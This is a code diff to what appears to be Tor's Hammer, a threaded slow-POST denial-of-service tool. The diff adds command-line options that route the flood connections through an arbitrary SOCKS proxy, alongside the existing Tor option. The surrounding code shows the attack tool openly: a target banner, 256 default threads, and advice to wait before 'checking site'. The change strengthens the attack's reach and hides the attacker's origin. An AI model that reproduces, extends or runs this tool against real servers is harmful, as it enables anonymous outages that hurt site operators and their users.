@@ -50,12 +50,14 @@ useragents = [
 
 
 class httpPost(Thread):
-    def __init__(self, host, port, tor):
+    def __init__(self, host, port, tor, sockshost, socksport):
         Thread.__init__(self)
         self.host = host
         self.port = port
         self.socks = socks.socksocket()
         self.tor = tor
+        self.sockshost = sockshost
+        self.socksport = socksport
         self.running = True
 
     def _send_http_post(self, pause=10):
@@ -88,6 +90,8 @@ class httpPost(Thread):
                     if self.tor:
                         self.socks.set_proxy(socks.SOCKS5, '127.0.0.1', 9050)
                         time.sleep(1)
+                    elif self.sockshost:
+                        self.socks.set_proxy(socks.SOCKS5, self.sockshost, self.socksport)
                     self.socks.connect((self.host, self.port))
                     print(term.BOL+term.UP+term.CLEAR_EOL+"Connected to host..."+ term.NORMAL)
                     break
@@ -115,13 +119,15 @@ def usage():
     print(" -r|--threads <Number of threads> Defaults to 256")
     print(" -p|--port <Web Server Port> Defaults to 80")
     print(" -T|--tor Enable anonymising through tor on 127.0.0.1:9050")
+    print(" -S|--sockshost <SOCKS host addrees> eg: 127.0.0.1")
+    print(" -P|--socksport <SOCSS host port> Defaults to 1080")
     print(" -h|--help Shows this help\n")
     print("Eg. ./torshammer.py -t 192.168.1.100 -r 256\n")
 
 
 def main(argv):
     try:
-        opts, args = getopt.getopt(argv, "hTt:r:p:", ["help", "tor", "target=", "threads=", "port="])
+        opts, args = getopt.getopt(argv, "hTt:r:p:S:P:", ["help", "tor", "target=", "threads=", "port=", "sockshost=", "socksport="])
     except getopt.GetoptError:
         usage()
         sys.exit(-1)
@@ -132,6 +138,8 @@ def main(argv):
     threads = 256
     tor = False
     port = 80
+    sockshost = False
+    socksport = 1080
 
     for o, a in opts:
         if o in ("-h", "--help"):
@@ -145,6 +153,10 @@ def main(argv):
             threads = int(a)
         elif o in ("-p", "--port"):
             port = int(a)
+        elif o in ("-S", "--sockshost"):
+            sockshost = a
+        elif o in ("-P", "--socksport"):
+            socksport = int(a)
 
     if target == '' or int(threads) <= 0:
         usage()
@@ -152,13 +164,16 @@ def main(argv):
 
     print(term.DOWN + term.RED + "/*" + term.NORMAL)
     print(term.RED + " * Target: %s Port: %d" % (target, port) + term.NORMAL)
-    print(term.RED + " * Threads: %d Tor: %s" % (threads, tor) + term.NORMAL)
+    if tor:
+        print(term.RED + " * Threads: %d Tor: %s" % (threads, tor) + term.NORMAL)
+    elif sockshost and socksport:
+        print(term.RED + " * SOCKS host: %s port: %d" % (sockshost, socksport) + term.NORMAL)
     print(term.RED + " * Give 20 seconds without tor or 40 with before checking site" + term.NORMAL)
     print(term.RED + " */" + term.DOWN + term.DOWN + term.NORMAL)
 
     rthreads = []
     for i in range(threads):
-        t = httpPost(target, port, tor)
+        t = httpPost(target, port, tor, sockshost, socksport)
         rthreads.append(t)
         t.start()
 
